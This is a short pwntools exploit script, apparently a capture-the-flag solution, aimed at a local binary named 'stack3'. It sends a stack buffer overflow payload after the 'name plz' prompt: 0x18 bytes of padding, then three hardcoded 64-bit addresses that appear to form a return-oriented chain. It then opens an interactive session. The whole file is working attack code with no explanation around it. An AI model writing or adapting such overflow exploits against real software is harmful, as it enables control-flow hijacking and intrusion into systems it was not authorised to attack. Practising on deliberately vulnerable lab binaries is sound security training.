from pwn import *

io = process("./stack3")

# io = gdb.debug(['./stack3'], "b print_name")

payload = b"a"*0x18 + p64(0x00000000004007c3) + p64(0x4007E4) + p64(0x400666)

io.sendlineafter("name plz", payload)

io.interactive()